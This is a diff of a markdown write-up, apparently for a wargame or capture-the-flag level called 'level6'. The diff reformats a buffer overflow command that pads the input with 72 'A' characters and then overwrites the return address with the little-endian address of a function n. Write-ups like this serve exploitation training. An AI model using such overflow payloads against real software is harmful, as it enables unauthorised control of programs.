@@ -30,4 +30,6 @@ address of `n` : 08048454
 little-endian : /x54/x84/x04/x08
 
 Putting this together give us :
-`./level6 $(python -c 'print "A"*72+"\x54\x84\x04\x08"')`
+```Shell
+./level6 $(python -c 'print "A" * 72 + "\x54\x84\x04\x08"')
+```
